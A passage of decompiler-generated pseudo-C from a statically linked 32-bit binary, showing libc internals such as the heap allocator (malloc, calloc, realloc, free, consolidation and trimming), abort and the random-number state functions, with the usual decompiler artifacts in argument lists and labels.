      v22 += 2;
      v24 *= 2;
    }
    v25 = (int *)v22[3];
    if ( v25 != v22 )
    {
      v26 = v25[3];
      v27 = v25[1] & 0xFFFFFFFC;
      v28 = v27 - v61;
      v22[3] = v26;
      *(_DWORD *)(v26 + 8) = v22;
      if ( v27 - v61 > 0xF )
      {
        v29 = (int *)((char *)v25 + v61);
        *(_DWORD *)(a1 + 8) = (char *)v25 + v61;
        *(_DWORD *)(a1 + 12) = (char *)v25 + v61;
        v29[2] = &unk_806A654;
        v29[3] = &unk_806A654;
        if ( v61 <= 0xFF )
          dword_806A650 = (int)v25 + v61;
        v25[1] = v61 | 1;
        *(_DWORD *)((char *)v29 + v28) = v28;
        v29[1] = v28 | 1;
      }
      else
      {
        *(int *)((char *)v25 + v27 + 4) |= 1u;
      }
      v3 = (int)(v25 + 2);
      goto LABEL_127;
    }
    v22 = v25 + 2;
    v23 &= ~v24;
    v24 *= 2;
    dword_806A954[a2] = v23;
  }
  while ( (unsigned int)++a2 <= 2 )
  {
    v23 = dword_806A954[a2];
    if ( v23 )
    {
      v24 = 1;
      v22 = &dword_806A64C[64 * a2];
      goto LABEL_50;
    }
  }
LABEL_59:
  v30 = dword_806A64C[0];
  v31 = *(_DWORD *)(dword_806A64C[0] + 4) & 0xFFFFFFFC;
  if ( v31 >= v61 + 16 )
  {
    v32 = dword_806A64C[0] + v61;
    dword_806A64C[0] += v61;
    *(_DWORD *)(v30 + 4) = v61 | 1;
    v33 = v31 - v61;
    goto LABEL_120;
  }
  if ( _malloc_state[0] & 2 )
  {
    _malloc_consolidate(_malloc_state);
    v3 = malloc(a1, a2, v61 - 7);
    goto LABEL_127;
  }
  v34 = dword_806A97C - 1;
  v35 = v61;
  v62 = dword_806A97C - 1;
  if ( v61 >= dword_806A96C && dword_806A970 < dword_806A974 )
  {
    v35 = ~v34 & (dword_806A97C + v61 + 10);
    if ( v35 > v61 )
    {
      v36 = mmap(v34, v35, a1, a2, v61 + 16, 0);
      v6 = (int *)v36;
      if ( v36 != -1 )
      {
        v37 = v36 & 7;
        if ( v36 & 7 )
        {
          v6 = (int *)(8 - v37 + v36);
          *v6 = 8 - v37;
          v38 = v35 - (8 - v37);
        }
        else
        {
          *(_DWORD *)v36 = 0;
          v38 = v35;
        }
        v6[1] = v38 | 2;
        v39 = dword_806A970 + 1;
        dword_806A970 = v39;
        if ( v39 > dword_806A978 )
          dword_806A978 = v39;
        v40 = v35 + dword_806A984;
        dword_806A984 = v40;
        if ( v40 > dword_806A990 )
          dword_806A990 = v40;
        v41 = dword_806A988 + v40;
        if ( v41 > dword_806A994 )
          dword_806A994 = v41;
        goto LABEL_14;
      }
    }
  }
  v63 = dword_806A64C[0];
  a1 = *(_DWORD *)(dword_806A64C[0] + 4) & 0xFFFFFFFC;
  v42 = dword_806A968 + v61 + 16;
  if ( dword_806A980 & 1 )
    v42 -= a1;
  v43 = v62 + v42;
  v64 = ~v62;
  v44 = v43 & ~v62;
  if ( (v43 & ~v62) <= 0 || (v45 = sbrk(v43 & ~v62), v46 = -1, v35 = v45, v45 == -1) )
  {
    if ( dword_806A980 & 1 )
      v44 = v64 & (a1 + v62 + v44);
    if ( v44 <= 0xFFFFF )
      v44 = 0x100000;
    if ( v44 > v61 )
    {
      v47 = mmap(v34, v35, a1, a2, v44, 0);
      v35 = v47;
      if ( v47 != -1 )
      {
        dword_806A980 &= 0xFFFFFFFE;
        v46 = v47 + v44;
        goto LABEL_87;
      }
    }
LABEL_126:
    v3 = 0;
    *(_DWORD *)_errno_location() = 12;
    goto LABEL_127;
  }
LABEL_87:
  if ( v35 == -1 )
    goto LABEL_126;
  dword_806A988 += v44;
  v48 = a1 + v63;
  if ( v35 != a1 + v63 || v46 != -1 )
  {
    if ( dword_806A980 & 1 && a1 && v35 < v48 )
      dword_806A980 &= 0xFFFFFFFE;
    if ( dword_806A980 & 1 )
    {
      if ( a1 )
        dword_806A988 += v35 - v48;
      v49 = v35 & 7;
      if ( v35 & 7 )
      {
        v51 = 8 - v49;
        v50 = v35 + 8 - v49;
      }
      else
      {
        v50 = v35;
        v51 = 0;
      }
      v52 = v35 + v44;
      v66 = v52;
      v53 = v51 + a1 + (v64 & (v51 + a1 + v52 + v62)) - (v51 + a1 + v52);
      v54 = sbrk(v53);
      v46 = v54;
      if ( v54 == -1 )
      {
        v46 = sbrk(0);
LABEL_109:
        v53 = 0;
        goto LABEL_110;
      }
      if ( v54 >= v35 )
      {
LABEL_110:
        if ( v46 != -1 )
        {
          dword_806A64C[0] = v50;
          *(_DWORD *)(v50 + 4) = (v46 - v50 + v53) | 1;
          dword_806A988 += v53;
          if ( a1 )
          {
            v55 = (a1 - 12) & 0xFFFFFFF8;
            *(_DWORD *)(v63 + 4) = v55 | 1;
            *(_DWORD *)(v63 + v55 + 4) = 5;
            *(_DWORD *)(v63 + v55 + 8) = 5;
            if ( v55 > 0xF )
            {
              v56 = dword_806A964;
              dword_806A964 = -1;
              free(a1, (_DWORD *)(v63 + 8));
              dword_806A964 = v56;
            }
          }
        }
        goto LABEL_114;
      }
      dword_806A980 &= 0xFFFFFFFE;
      v46 = v66;
    }
    else
    {
      if ( v46 == -1 )
      {
        v50 = v35;
        v46 = sbrk(0);
        dword_806A988 += v46 - v35 - v44;
        goto LABEL_109;
      }
      v50 = v35;
    }
    v53 = 0;
    goto LABEL_110;
  }
  *(_DWORD *)(v63 + 4) = (v44 + a1) | 1;
LABEL_114:
  if ( dword_806A988 > (unsigned int)dword_806A98C )
    dword_806A98C = dword_806A988;
  if ( dword_806A984 + dword_806A988 > (unsigned int)dword_806A994 )
    dword_806A994 = dword_806A984 + dword_806A988;
  v30 = dword_806A64C[0];
  v57 = *(_DWORD *)(dword_806A64C[0] + 4) & 0xFFFFFFFC;
  if ( v57 < v61 + 16 )
    goto LABEL_126;
  v33 = v57 - v61;
  v32 = dword_806A64C[0] + v61;
  dword_806A64C[0] += v61;
  *(_DWORD *)(v30 + 4) = v61 | 1;
LABEL_120:
  v3 = v30 + 8;
  *(_DWORD *)(v32 + 4) = v33 | 1;
LABEL_127:
  pthread_cleanup_pop_restore(a1, (int)&v67, 1);
  return v3;
}
// 806A64C: using guessed type int dword_806A64C[];
// 806A650: using guessed type int dword_806A650;
// 806A65C: using guessed type int dword_806A65C;
// 806A660: using guessed type int dword_806A660;
// 806A964: using guessed type int dword_806A964;
// 806A968: using guessed type int dword_806A968;
// 806A96C: using guessed type int dword_806A96C;
// 806A970: using guessed type int dword_806A970;
// 806A974: using guessed type int dword_806A974;
// 806A978: using guessed type int dword_806A978;
// 806A97C: using guessed type int dword_806A97C;
// 806A980: using guessed type int dword_806A980;
// 806A984: using guessed type int dword_806A984;
// 806A988: using guessed type int dword_806A988;
// 806A98C: using guessed type int dword_806A98C;
// 806A990: using guessed type int dword_806A990;
// 806A994: using guessed type int dword_806A994;

//----- (08052ACC) --------------------------------------------------------
_DWORD *__usercall calloc@<eax>(off_t a1@<ebp>, int a2@<edi>, unsigned int a3, int a4)
{
  unsigned int v4; // ebx@1
  _DWORD *v5; // ebx@3
  int v6; // eax@4
  int v7; // eax@5
  unsigned int v8; // edx@6
  unsigned int v9; // eax@6
  char v11; // [esp+10h] [ebp-1Ch]@4

  v4 = a4 * a3;
  if ( a3 && (a2 = a3, a4 != v4 / a3) )
  {
    v5 = 0;
    *(_DWORD *)_errno_location() = 12;
  }
  else
  {
    pthread_cleanup_push_defer(&v11, (int)pthread_mutex_unlock, (int)&_malloc_lock);
    pthread_mutex_lock((int)&_malloc_lock);
    v6 = malloc(a1, a2, v4);
    v5 = (_DWORD *)v6;
    if ( v6 )
    {
      v7 = *(_DWORD *)(v6 - 4);
      if ( !(v7 & 2) )
      {
        v8 = (v7 & 0xFFFFFFFC) - 4;
        v9 = v8 >> 2;
        if ( v9 <= 9 )
        {
          *v5 = 0;
          v5[1] = 0;
          v5[2] = 0;
          if ( v9 > 4 )
          {
            v5[3] = 0;
            v5[4] = 0;
            if ( v9 > 6 )
            {
              v5[5] = 0;
              v5[6] = 0;
              if ( v9 > 8 )
              {
                v5[7] = 0;
                v5[8] = 0;
              }
            }
          }
        }
        else
        {
          memset(v5, 0, v8);
        }
      }
    }
    pthread_cleanup_pop_restore(a1, (int)&v11, 1);
  }
  return v5;
}

//----- (08052BC0) --------------------------------------------------------
int __usercall realloc@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, char *a3, unsigned int a4)
{
  int v4; // ebx@1
  int v5; // edi@9
  int v6; // edx@9
  unsigned int v7; // eax@9
  unsigned int v8; // ebx@10
  _DWORD *v9; // esi@11
  unsigned int v10; // ecx@12
  int v11; // edx@16
  int v12; // eax@16
  int v13; // eax@20
  int v14; // edx@20
  int v15; // ebx@21
  bool v16; // zf@21
  int v17; // eax@21
  unsigned int v18; // ecx@23
  int v19; // ecx@30
  int v20; // eax@32
  int v21; // edx@34
  int v22; // eax@34
  int v23; // esi@34
  int v24; // ebx@34
  void *v25; // edi@35
  unsigned int v26; // eax@35
  int v27; // edx@36
  unsigned int v28; // eax@36
  unsigned int v29; // eax@38
  char *v30; // eax@42
  unsigned int v32; // [esp+14h] [ebp-28h]@7
  unsigned int v33; // [esp+18h] [ebp-24h]@9
  char v34; // [esp+1Ch] [ebp-20h]@5

  v4 = a4;
  if ( a3 )
  {
    if ( !a4 )
    {
      free(a1, a3);
      return v4;
    }
    pthread_cleanup_push_defer(&v34, (int)pthread_mutex_unlock, (int)&_malloc_lock);
    pthread_mutex_lock((int)&_malloc_lock);
    if ( a4 > 0xFFFFFFDF )
    {
      v4 = 0;
      *(_DWORD *)_errno_location() = 12;
      return v4;
    }
    v32 = 16;
    if ( a4 + 11 > 0xF )
      v32 = (a4 + 11) & 0xFFFFFFF8;
    v5 = (int)(a3 - 8);
    v6 = *((_DWORD *)a3 - 1);
    v7 = *((_DWORD *)a3 - 1) & 0xFFFFFFFC;
    v33 = *((_DWORD *)a3 - 1) & 0xFFFFFFFC;
    if ( v6 & 2 )
    {
      a1 = *((_DWORD *)a3 - 2);
      v21 = dword_806A97C - 1 + a1;
      v22 = ~(dword_806A97C - 1);
      v23 = v22 & (v21 + v32 + 4);
      v24 = (v22 & (v21 + v32 + 4)) - a1;
      if ( v33 == v24 )
        goto LABEL_46;
      v25 = (void *)(v5 - a1);
      v26 = mremap(v25, a1 + v33, v22 & (v21 + v32 + 4), 1u);
      if ( v26 != -1 )
      {
        v27 = v26 + a1;
        *(_DWORD *)(v26 + a1 + 4) = v24 | 2;
        v28 = dword_806A984 + v23 - v33;
        dword_806A984 = v28;
        if ( v28 > dword_806A990 )
          dword_806A990 = v28;
        v29 = dword_806A988 + v28;
        if ( v29 > dword_806A994 )
          dword_806A994 = v29;
        v4 = v27 + 8;
        goto LABEL_47;
      }
      if ( v33 >= v32 + 4 )
        goto LABEL_46;
      v30 = (char *)malloc(a1, (int)v25, v32 - 7);
      v4 = (int)v30;
      if ( v30 )
      {
        memcpy(v30, a3, v33 - 8);
        free(a1, a3);
        goto LABEL_47;
      }
      goto LABEL_45;
    }
    v8 = *((_DWORD *)a3 - 1) & 0xFFFFFFFC;
    if ( v7 < v32 )
    {
      v9 = (_DWORD *)(v5 + v7);
      if ( v5 + v7 == dword_806A64C[0] )
      {
        v10 = (v9[1] & 0xFFFFFFFC) + v7;
        if ( v10 >= v32 + 16 )
        {
          *(_DWORD *)(v5 + 4) = v32 | *((_DWORD *)a3 - 1) & 1;
          dword_806A64C[0] = v5 + v32;
          *(_DWORD *)(v5 + v32 + 4) = (v10 - v32) | 1;
LABEL_46:
          v4 = (int)a3;
          goto LABEL_47;
        }
LABEL_20:
        v13 = malloc(a1, v5, v32 - 7);
        v14 = v13;
        if ( v13 )
        {
          v15 = v13 - 8;
          v16 = v13 - 8 == (_DWORD)v9;
          v17 = *(_DWORD *)(v13 - 8 + 4);
          if ( !v16 )
          {
            v18 = (v33 - 4) >> 2;
            if ( v18 <= 9 )
            {
              *(_DWORD *)v14 = *(_DWORD *)a3;
              *(_DWORD *)(v14 + 4) = *((_DWORD *)a3 + 1);
              *(_DWORD *)(v14 + 8) = *((_DWORD *)a3 + 2);
              if ( v18 > 4 )
              {
                *(_DWORD *)(v14 + 12) = *((_DWORD *)a3 + 3);
                *(_DWORD *)(v14 + 16) = *((_DWORD *)a3 + 4);
                if ( v18 > 6 )
                {
                  *(_DWORD *)(v14 + 20) = *((_DWORD *)a3 + 5);
                  *(_DWORD *)(v14 + 24) = *((_DWORD *)a3 + 6);
                  if ( v18 > 8 )
                  {
                    *(_DWORD *)(v14 + 28) = *((_DWORD *)a3 + 7);
                    *(_DWORD *)(v14 + 32) = *((_DWORD *)a3 + 8);
                  }
                }
              }
            }
            else
            {
              memcpy((char *)v14, a3, v33 - 4);
            }
            v4 = v15 + 8;
            free(a1, a3);
            goto LABEL_47;
          }
          v8 = (v17 & 0xFFFFFFFC) + v33;
          goto LABEL_30;
        }
LABEL_45:
        v4 = 0;
LABEL_47:
        pthread_cleanup_pop_restore(a1, (int)&v34, 1);
        return v4;
      }
      if ( *((_BYTE *)v9 + (v9[1] & 0xFFFFFFFE) + 4) & 1 )
        goto LABEL_20;
      v8 = (v9[1] & 0xFFFFFFFC) + v33;
      if ( v8 < v32 )
        goto LABEL_20;
      v11 = v9[2];
      v12 = v9[3];
      if ( *(_DWORD **)(v11 + 12) != v9 || *(_DWORD **)(v12 + 8) != v9 )
        abort();
      *(_DWORD *)(v11 + 12) = v12;
      *(_DWORD *)(v12 + 8) = v11;
    }
LABEL_30:
    v19 = v8 - v32;
    if ( v8 - v32 > 0xF )
    {
      v20 = v5 + v32;
      *(_DWORD *)(v5 + 4) = v32 | *(_DWORD *)(v5 + 4) & 1;
      *(_DWORD *)(v20 + 4) = v19 | 1;
      *(_DWORD *)(v20 + v19 + 4) |= 1u;
      free(a1, (_DWORD *)(v5 + v32 + 8));
    }
    else
    {
      *(_DWORD *)(v5 + 4) = v8 | *(_DWORD *)(v5 + 4) & 1;
      *(_DWORD *)(v5 + v8 + 4) |= 1u;
    }
    v4 = (int)a3;
    goto LABEL_47;
  }
  return malloc(a1, a2, a4);
}
// 806A64C: using guessed type int dword_806A64C[];
// 806A97C: using guessed type int dword_806A97C;
// 806A984: using guessed type int dword_806A984;
// 806A988: using guessed type int dword_806A988;
// 806A990: using guessed type int dword_806A990;
// 806A994: using guessed type int dword_806A994;

//----- (08052EE8) --------------------------------------------------------
signed int __usercall _malloc_trim@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebp@1
  unsigned int v3; // esi@1
  signed int v4; // ebx@1
  int v5; // edi@2
  int v6; // eax@3
  int v7; // ecx@4
  int v8; // eax@5

  v2 = a2;
  v3 = *(_DWORD *)(*(_DWORD *)(a2 + 44) + 4) & 0xFFFFFFFC;
  v4 = *(_DWORD *)(a2 + 860) * ((v3 - a1 + *(_DWORD *)(a2 + 860) - 17) / *(_DWORD *)(a2 + 860) - 1);
  if ( v4 <= 0 )
    return 0;
  v5 = sbrk(0);
  if ( v5 != *(_DWORD *)(v2 + 44) + v3 )
    return 0;
  sbrk(-v4);
  v6 = sbrk(0);
  if ( v6 == -1 )
    return 0;
  v7 = v5 - v6;
  if ( v5 == v6 )
    return 0;
  v8 = *(_DWORD *)(v2 + 44);
  *(_DWORD *)(v2 + 872) -= v7;
  *(_DWORD *)(v8 + 4) = (v3 - v7) | 1;
  return 1;
}

//----- (08052F75) --------------------------------------------------------
int __cdecl _malloc_consolidate(int *a1)
{
  signed int v1; // edx@1
  int result; // eax@3
  int *v3; // ecx@3
  unsigned int v4; // edi@5
  _DWORD *v5; // ebx@5
  int v6; // ebp@6
  int v7; // eax@6
  int v8; // esi@6
  int v9; // edx@6
  unsigned int v10; // ebp@9
  int v11; // eax@10
  int v12; // edx@11
  int v13; // eax@11
  _DWORD *v14; // esi@11
  int v15; // edx@15
  int v16; // eax@20
  int v17; // [esp+8h] [ebp-24h]@5
  int **v18; // [esp+Ch] [ebp-20h]@2
  int v19; // [esp+10h] [ebp-1Ch]@2
  int *v20; // [esp+14h] [ebp-18h]@5

  v1 = 1;
  if ( *a1 )
  {
    *a1 &= 0xFFFFFFFD;
    v18 = (int **)(a1 + 1);
    v19 = (int)&a1[((unsigned int)*a1 >> 3) - 1];
    while ( 1 )
    {
      result = (int)v18;
      v3 = *v18;
      if ( *v18 )
      {
        *v18 = 0;
        do
        {
          v20 = (int *)v3[2];
          v4 = v3[1] & 0xFFFFFFFE;
          v5 = (int *)((char *)v3 + v4);
          v17 = *(int *)((char *)v3 + v4 + 4);
          if ( !(v3[1] & 1) )
          {
            v6 = *v3;
            v7 = (int)v3 - *v3;
            v8 = *(_DWORD *)(v7 + 8);
            v9 = *(_DWORD *)(v7 + 12);
            v3 = *(int **)(v8 + 12);
            if ( v3 != (int *)v7 || *(int **)(v9 + 8) != v3 )
LABEL_13:
              abort();
            v4 += v6;
            *(_DWORD *)(v8 + 12) = v9;
            *(_DWORD *)(v9 + 8) = v8;
          }
          v10 = v17 & 0xFFFFFFFC;
          if ( v5 == (_DWORD *)a1[11] )
          {
            result = (v4 + v10) | 1;
            v3[1] = result;
            a1[11] = (int)v3;
          }
          else
          {
            v11 = *(_DWORD *)((char *)v5 + v10 + 4);
            v5[1] = v10;
            if ( !(v11 & 1) )
            {
              v12 = v5[2];
              v13 = v5[3];
              v14 = *(_DWORD **)(v12 + 12);
              if ( v14 != v5 || *(_DWORD **)(v13 + 8) != v14 )
                goto LABEL_13;
              v4 += v10;
              *(_DWORD *)(v12 + 12) = v13;
              *(_DWORD *)(v13 + 8) = v12;
            }
            v15 = a1[15];
            a1[15] = (int)v3;
            *(_DWORD *)(v15 + 12) = v3;
            v3[1] = v4 | 1;
            result = (int)(a1 + 13);
            v3[2] = v15;
            v3[3] = (int)(a1 + 13);
            *(int *)((char *)v3 + v4) = v4;
          }
          v3 = v20;
        }
        while ( v20 );
      }
      if ( v18 == (int **)v19 )
        break;
      ++v18;
    }
  }
  else
  {
    while ( v1 <= 95 )
    {
      v16 = (int)&a1[2 * v1++ + 11];
      *(_DWORD *)(v16 + 12) = v16;
      *(_DWORD *)(v16 + 8) = v16;
    }
    a1[216] |= 1u;
    a1[210] = 0;
    a1[213] = 0x10000;
    a1[211] = 0x40000;
    a1[209] = 0x40000;
    *a1 = *a1 & 3 | 0x48;
    a1[11] = (int)(a1 + 13);
    result = sysconf(30);
    a1[215] = result;
  }
  return result;
}

//----- (0805311D) --------------------------------------------------------
void __usercall free(unsigned int ebp0@<ebp>, _DWORD *a1)
{
  _DWORD *v2; // ecx@2
  unsigned int v3; // ebx@2
  int *v4; // edx@3
  _DWORD *v5; // esi@5
  int v6; // ebp@6
  int v7; // eax@6
  int v8; // edi@6
  int v9; // edx@6
  int v10; // eax@10
  int v11; // edx@11
  int v12; // eax@11
  _DWORD *v13; // edi@11
  int v14; // eax@15
  int v15; // edx@22
  int v16; // [esp+18h] [ebp-24h]@5
  char v17; // [esp+1Ch] [ebp-20h]@2

  if ( a1 )
  {
    pthread_cleanup_push_defer(&v17, (int)pthread_mutex_unlock, (int)&_malloc_lock);
    pthread_mutex_lock((int)&_malloc_lock);
    v2 = a1 - 2;
    v3 = *(a1 - 1) & 0xFFFFFFFC;
    if ( v3 <= _malloc_state[0] )
    {
      _malloc_state[0] |= 3u;
      v4 = &_malloc_state[v3 >> 3];
      *a1 = *(v4 - 1);
      *(v4 - 1) = (int)v2;
LABEL_23:
      pthread_cleanup_pop_restore(ebp0, (int)&v17, 1);
      return;
    }
    if ( *(a1 - 1) & 2 )
    {
      v15 = *(a1 - 2);
      --dword_806A970;
      dword_806A984 -= v3 + v15;
      munmap((int)v2 - v15, v3 + v15);
      goto LABEL_23;
    }
    v5 = (_DWORD *)((char *)v2 + v3);
    _malloc_state[0] |= 1u;
    v16 = *(_DWORD *)((char *)v2 + v3 + 4);
    if ( !(*((_BYTE *)v2 + 4) & 1) )
    {
      v6 = *(a1 - 2);
      v7 = (int)v2 - v6;
      v8 = *(_DWORD *)((char *)v2 + -v6 + 8);
      v9 = *(_DWORD *)((char *)v2 + -v6 + 12);
      v2 = *(_DWORD **)(v8 + 12);
      if ( v2 != (_DWORD *)v7 || *(_DWORD **)(v9 + 8) != v2 )
LABEL_13:
        abort();
      v3 += v6;
      *(_DWORD *)(v8 + 12) = v9;
      *(_DWORD *)(v9 + 8) = v8;
    }
    ebp0 = v16 & 0xFFFFFFFC;
    if ( v5 == (_DWORD *)dword_806A64C[0] )
    {
      v3 += ebp0;
      v2[1] = v3 | 1;
      dword_806A64C[0] = (int)v2;
    }
    else
    {
      v10 = *(_DWORD *)((char *)v5 + ebp0 + 4);
      v5[1] = ebp0;
      if ( !(v10 & 1) )
      {
        v11 = v5[2];
        v12 = v5[3];
        v13 = *(_DWORD **)(v11 + 12);
        if ( v13 != v5 || *(_DWORD **)(v12 + 8) != v13 )
          goto LABEL_13;
        *(_DWORD *)(v11 + 12) = v12;
        *(_DWORD *)(v12 + 8) = v11;
        v3 += ebp0;
      }
      v14 = dword_806A65C;
      v2[3] = &unk_806A654;
      v2[2] = v14;
      *(_DWORD *)((char *)v2 + v3) = v3;
      *(_DWORD *)(v14 + 12) = v2;
      dword_806A65C = (int)v2;
      v2[1] = v3 | 1;
    }
    if ( v3 > 0x1FFFF )
    {
      if ( _malloc_state[0] & 2 )
        _malloc_consolidate(_malloc_state);
      if ( (*(_DWORD *)(dword_806A64C[0] + 4) & 0xFFFFFFFC) >= dword_806A964 )
        _malloc_trim(dword_806A968, (int)_malloc_state);
    }
    goto LABEL_23;
  }
}
// 806A64C: using guessed type int dword_806A64C[];
// 806A65C: using guessed type int dword_806A65C;
// 806A964: using guessed type int dword_806A964;
// 806A968: using guessed type int dword_806A968;
// 806A970: using guessed type int dword_806A970;
// 806A984: using guessed type int dword_806A984;

//----- (080532B9) --------------------------------------------------------
signed int __cdecl malloc_trim(int a1)
{
  _malloc_consolidate(_malloc_state);
  return _malloc_trim(a1, (int)_malloc_state);
}

//----- (080532DC) --------------------------------------------------------
void __noreturn abort()
{
  signed int i; // eax@1
  signed int j; // eax@10
  int v2; // [esp+1Ch] [ebp-110h]@10
  int v3[32]; // [esp+20h] [ebp-10Ch]@11
  int v4; // [esp+A0h] [ebp-8Ch]@13
  int v5[33]; // [esp+A8h] [ebp-84h]@2

  pthread_mutex_lock((int)&mylock);
  for ( i = 32; --i >= 0; v5[i] = 0 )
    ;
  if ( !_sigaddset((int)v5, 6) )
    sigprocmask(1u, (int)v5);
  if ( been_there_done_that )
    goto LABEL_9;
  been_there_done_that = 1;
  while ( 1 )
  {
    pthread_mutex_unlock((int)&mylock);
    raise(6);
    pthread_mutex_lock((int)&mylock);
LABEL_9:
    if ( been_there_done_that != 1 )
    {
      if ( been_there_done_that == 2 )
      {
        been_there_done_that = 3;
        __halt();
      }
      if ( been_there_done_that == 3 )
      {
        been_there_done_that = 4;
        exit(127);
      }
      __halt();
      JUMPOUT(loc_80533EB);
    }
    been_there_done_that = 2;
    memset(&v2, 0, 0x8Cu);
    v2 = 0;
    for ( j = 32; --j >= 0; v3[j] = -1 )
      ;
    v4 = 0;
    sigaction(6, (char *)&v2, 0);
  }
}
// 806A460: using guessed type char been_there_done_that;
// 80532DC: using guessed type int var_84[33];
// 80532DC: using guessed type int var_10C[32];

//----- (080533F8) --------------------------------------------------------
int __usercall random@<eax>(off_t a1@<ebp>)
{
  char v2; // [esp+24h] [ebp-18h]@1
  int v3; // [esp+34h] [ebp-8h]@1

  pthread_cleanup_push_defer(&v2, (int)pthread_mutex_unlock, (int)&mylock_0);
  pthread_mutex_lock((int)&mylock_0);
  random_r((int)&unsafe_state, &v3);
  pthread_cleanup_pop_restore(a1, (int)&v2, 1);
  return v3;
}
// 8061B18: using guessed type void *unsafe_state;

//----- (08053440) --------------------------------------------------------
int __usercall setstate@<eax>(off_t a1@<ebp>, _DWORD *a2)
{
  int v2; // esi@1
  char *v3; // ebx@1
  char v5; // [esp+14h] [ebp-18h]@1

  v2 = 0;
  pthread_cleanup_push_defer(&v5, (int)pthread_mutex_unlock, (int)&mylock_0);
  pthread_mutex_lock((int)&mylock_0);
  v3 = (char *)off_8061B20;
  if ( setstate_r(a2, &unsafe_state) >= 0 )
    v2 = (int)(v3 - 4);
  pthread_cleanup_pop_restore(a1, (int)&v5, 1);
  return v2;
}
// 8061B18: using guessed type void *unsafe_state;
// 8061B20: using guessed type void *off_8061B20;

//----- (0805349D) --------------------------------------------------------
int __usercall initstate@<eax>(off_t a1@<ebp>, signed int a2, _DWORD *a3, unsigned int a4)
{
  char *v4; // esi@1
  char v6; // [esp+14h] [ebp-18h]@1

  pthread_cleanup_push_defer(&v6, (int)pthread_mutex_unlock, (int)&mylock_0);
  pthread_mutex_lock((int)&mylock_0);
  v4 = (char *)off_8061B20;
  initstate_r(a2, a3, a4, &unsafe_state);
  pthread_cleanup_pop_restore(a1, (int)&v6, 1);
  return (int)(v4 - 4);
}
// 8061B18: using guessed type void *unsafe_state;
// 8061B20: using guessed type void *off_8061B20;

//----- (080534F4) --------------------------------------------------------
int __usercall srandom@<eax>(off_t a1@<ebp>, signed int a2)
{
  char v3; // [esp+18h] [ebp-14h]@1

  pthread_cleanup_push_defer(&v3, (int)pthread_mutex_unlock, (int)&mylock_0);
  pthread_mutex_lock((int)&mylock_0);
  srandom_r(a2, &unsafe_state);
  return pthread_cleanup_pop_restore(a1, (int)&v3, 1);
}
// 8061B18: using guessed type void *unsafe_state;

//----- (08053538) --------------------------------------------------------
signed int __cdecl setstate_r(_DWORD *a1, _DWORD *a2)
{
  int v2; // esi@1
  int v3; // ecx@1
  int v4; // edx@1
  unsigned int v5; // edx@4
  int v6; // ecx@5
  int v7; // ebp@5
  int v8; // eax@6
  signed int result; // eax@7

  v2 = (int)(a1 + 1);
  v3 = a2[3];
  v4 = a2[2];
  if ( v3 )
    *(_DWORD *)(v4 - 4) = v3 + 5 * ((a2[1] - v4) >> 2);
  else
    *(_DWORD *)(v4 - 4) = 0;
  v5 = *a1 % 5;
  if ( v5 > 4 )
  {
    *(_DWORD *)_errno_location() = 22;
    result = -1;
  }
  else
  {
    v6 = dword_805B2F4[v5];
    v7 = random_poly_info[v5];
    a2[4] = v6;
    a2[5] = v7;
    a2[3] = v5;
    if ( v5 )
    {
      v8 = *a1 / 5;
      a2[1] = v2 + 4 * v8;
      *a2 = v2 + 4 * ((v7 + v8) % v6);
    }
    a2[2] = v2;
    a2[6] = v2 + 4 * v6;
    result = 0;
  }
  return result;
}

//----- (080535D1) --------------------------------------------------------
int __cdecl random_r(int a1, _DWORD *a2)
{
  int *v2; // esi@1
  int v3; // eax@2
  _DWORD *v4; // ecx@3
  unsigned int *v5; // edx@3
  unsigned int v6; // edi@3
  unsigned int v7; // eax@3
  unsigned int v8; // edx@3
  unsigned int v9; // eax@3

  v2 = *(int **)(a1 + 8);
  if ( *(_DWORD *)(a1 + 12) )
  {
    v4 = *(_DWORD **)(a1 + 4);
    v5 = *(unsigned int **)a1;
    v6 = *(_DWORD *)(a1 + 24);
    *v5 += *v4;
    v7 = *v5;
    v8 = (unsigned int)(v5 + 1);
    *a2 = v7 >> 1;
    v9 = (unsigned int)(v4 + 1);
    if ( v8 < v6 )
    {
      if ( v9 >= v6 )
        v9 = (unsigned int)v2;
    }
    else
    {
      v8 = (unsigned int)v2;
    }
    *(_DWORD *)a1 = v8;
    *(_DWORD *)(a1 + 4) = v9;
  }
  else
  {
    v3 = (1103515245 * *v2 + 12345) & 0x7FFFFFFF;
    *v2 = v3;
    *a2 = v3;
  }
  return 0;
}

//----- (08053630) --------------------------------------------------------
signed int __cdecl srandom_r(signed int a1, _DWORD *a2)
{
  signed int v2; // ecx@1
  signed int v3; // eax@1
  unsigned int v4; // edx@1
  signed int *v5; // ebx@2
  int v6; // edx@5
  int *v7; // ecx@5
  signed int v8; // edi@5
  int v9; // edx@6
  int v10; // eax@8
  int v11; // ebx@8
  signed int v13; // [esp+0h] [ebp-28h]@5
  char v14; // [esp+14h] [ebp-14h]@9

  v2 = -1;
  v3 = a1;
  v4 = a2[3];
  if ( v4 <= 4 )
  {
    v5 = (signed int *)a2[2];
    if ( !a1 )
      v3 = 1;
    *v5 = v3;
    if ( v4 )
    {
      v6 = v3;
      v7 = v5;
      v8 = 1;
      v13 = a2[4];
      while ( v8 < v13 )
      {
        v9 = 16807 * (v6 % 127773) - 2836 * (v6 / 127773);
        v6 = v9 + ((char)-(v9 < 0) & 0x7FFFFFFF);
        ++v7;
        ++v8;
        *v7 = v6;
      }
      v10 = a2[5];
      a2[1] = v5;
      *a2 = &v5[v10];
      v11 = 10 * v13;
      while ( --v11 >= 0 )
        random_r((int)a2, &v14);
    }
    v2 = 0;
  }
  return v2;
}

//----- (080536C6) --------------------------------------------------------
signed int __cdecl initstate_r(signed int a1, _DWORD *a2, unsigned int a3, _DWORD *a4)
{
  int v4; // ebx@2
  int v5; // eax@7
  int v6; // edx@7
  signed int result; // eax@5

  if ( a3 <= 0x7F )
  {
    if ( a3 > 0x1F )
    {
      v4 = 2 - (a3 < 0x40);
    }
    else
    {
      v4 = 0;
      if ( a3 <= 7 )
      {
        *(_DWORD *)_errno_location() = 22;
        *(_DWORD *)_errno_location() = 22;
        return -1;
      }
    }
  }
  else
  {
    v4 = 4 - (a3 < 0x100);
  }
  v5 = dword_805B2F4[v4];
  a4[4] = v5;
  v6 = random_poly_info[v4];
  a4[3] = v4;
  a4[5] = v6;
  a4[6] = &a2[v5 + 1];
  a4[2] = a2 + 1;
  srandom_r(a1, a4);
  *a2 = 0;
  result = 0;
  if ( v4 )
  {
    *a2 = v4 + 5 * ((a4[1] - (signed int)(a2 + 1)) >> 2);
    result = 0;
